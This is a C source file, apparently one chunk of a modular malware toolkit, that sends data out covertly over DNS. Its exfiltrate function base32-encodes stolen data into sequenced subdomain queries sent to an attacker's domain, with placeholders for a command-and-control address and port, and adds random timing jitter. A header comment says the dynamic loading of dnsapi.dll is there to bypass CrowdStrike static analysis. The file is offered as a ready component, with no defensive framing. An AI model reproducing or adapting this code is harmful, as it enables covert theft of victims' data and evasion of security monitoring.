// chunk: exfil/dns_dynamic
// depends: core/emit_buffer
// provides: exfiltrate
// note: Dynamic dnsapi.dll loading - DNS TXT query exfil bypassing CrowdStrike static analysis

#ifndef CHUNK_DNS_DYNAMIC
#define CHUNK_DNS_DYNAMIC

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}
#define CHUNK_SIZE 63

typedef struct {
    DWORD Reserved;
} DNS_RECORD_FLAGS;

typedef struct _DNS_RECORD {
    struct _DNS_RECORD *pNext;
    LPSTR pName;
    WORD wType;
    WORD wDataLength;
    DNS_RECORD_FLAGS Flags;
    DWORD dwTtl;
    DWORD dwReserved;
    union {
        DWORD A;
        struct { LPSTR pNameHost; } CNAME;
        struct { LPSTR pStringData; } TXT;
    } Data;
} DNS_RECORD;

typedef LONG (WINAPI *fn_DnsQuery_A)(LPCSTR, WORD, DWORD, LPVOID, DNS_RECORD**, LPVOID);
typedef void (WINAPI *fn_DnsRecordListFree)(DNS_RECORD*, DWORD);

static char _dns_b32_table[] = "abcdefghijklmnopqrstuvwxyz234567";

static void _dns_b32_encode(const unsigned char *in, int len, char *out) {
    int i, idx = 0, bit = 0;
    int val = 0;
    while (idx < len) {
        val = (val << 8) | in[idx++];
        bit += 8;
        while (bit >= 5) {
            bit -= 5;
            *out++ = _dns_b32_table[(val >> bit) & 0x1F];
        }
    }
    if (bit > 0) *out++ = _dns_b32_table[(val << (5 - bit)) & 0x1F];
    *out = 0;
}

static BOOL exfiltrate(const char *domain, int unused, const char *data, DWORD len) {
    (void)unused;
    if (!data || len == 0 || !domain) return FALSE;

    HMODULE dns = LoadLibraryA("dnsapi.dll");
    if (!dns) return FALSE;

    fn_DnsQuery_A pQuery = (fn_DnsQuery_A)GetProcAddress(dns, "DnsQuery_A");
    fn_DnsRecordListFree pFree = (fn_DnsRecordListFree)GetProcAddress(dns, "DnsRecordListFree");

    if (!pQuery) {
        FreeLibrary(dns);
        return FALSE;
    }

    DWORD sent = 0;
    int seq = 0;
    char subdomain[256];
    char encoded[128];
    char query[512];

    while (sent < len) {
        DWORD chunk = len - sent;
        if (chunk > 30) chunk = 30;  // ~50 chars after base32

        _dns_b32_encode((unsigned char*)(data + sent), chunk, encoded);

        // Format: <seq>.<encoded>.<domain>
        snprintf(query, sizeof(query), "%d.%s.%s", seq++, encoded, domain);

        DNS_RECORD *rec = NULL;
        pQuery(query, 16, 0, NULL, &rec, NULL);  // DNS_TYPE_TXT = 16
        if (rec && pFree) pFree(rec, 0);

        sent += chunk;
        Sleep(100 + (GetTickCount() % 200));  // Jitter
    }

    // Signal end
    snprintf(query, sizeof(query), "end.%d.%s", seq, domain);
    DNS_RECORD *rec = NULL;
    pQuery(query, 16, 0, NULL, &rec, NULL);
    if (rec && pFree) pFree(rec, 0);

    FreeLibrary(dns);
    return TRUE;
}

#endif
